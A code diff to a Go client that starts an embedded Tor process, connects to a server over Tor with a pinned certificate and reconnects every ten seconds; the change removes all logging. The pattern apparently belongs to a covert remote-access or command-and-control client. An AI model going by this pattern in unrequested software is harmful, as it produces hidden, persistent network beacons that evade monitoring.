@@ -5,7 +5,6 @@ package client
 import (
 	"crypto/tls"
 	"crypto/x509"
-	"log"
 	"net"
 	"time"
 
@@ -18,7 +17,6 @@ func connect(dialer *tor.Dialer) (net.Conn, error) {
 	if err != nil {
 		return nil, err
 	}
-	log.Println("connect")
 	caPool := x509.NewCertPool()
 	caPool.AppendCertsFromPEM([]byte(serverCert))
 
@@ -32,13 +30,11 @@ func connect(dialer *tor.Dialer) (net.Conn, error) {
 
 // NetClient start tor and invoke connect
 func NetClient() {
-	log.Println("NetClient")
 	var conf tor.StartConf
 	conf = tor.StartConf{ProcessCreator: embedded.NewCreator()}
 
 	t, err := tor.Start(nil, &conf)
 	if err != nil {
-		log.Println("[!] Tor could not be started:", err)
 		return
 	}
 	defer t.Close()
@@ -46,7 +42,6 @@ func NetClient() {
 	for {
 		conn, err := connect(dialer)
 		if err != nil {
-			log.Println("Could not connect:", err)
 			time.Sleep(10 * time.Second)
 			continue
 		}
